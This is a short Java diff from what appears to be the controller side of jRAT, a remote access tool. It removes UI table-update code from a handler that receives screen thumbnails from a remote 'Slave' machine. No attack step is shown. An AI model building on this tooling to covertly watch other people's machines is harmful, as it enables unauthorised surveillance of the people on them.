@@ -7,8 +7,6 @@ import java.io.DataInputStream;
 import javax.swing.ImageIcon;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.frames.Frame;
-import se.jrat.client.utils.Utils;
 
 
 public class Packet33Thumbnail extends AbstractIncomingPacket {
@@ -23,12 +21,6 @@ public class Packet33Thumbnail extends AbstractIncomingPacket {
 		slave.getDataInputStream().readFully(buffer);
 
 		slave.setThumbnail(new ImageIcon(bufferedImage));
-
-		int row = Utils.getRow(slave);
-
-		if (row != -1 && Frame.thumbnails) {
-			Frame.mainModel.setValueAt(slave.getThumbnail(), row, 0);
-		}
 	}
 
 }
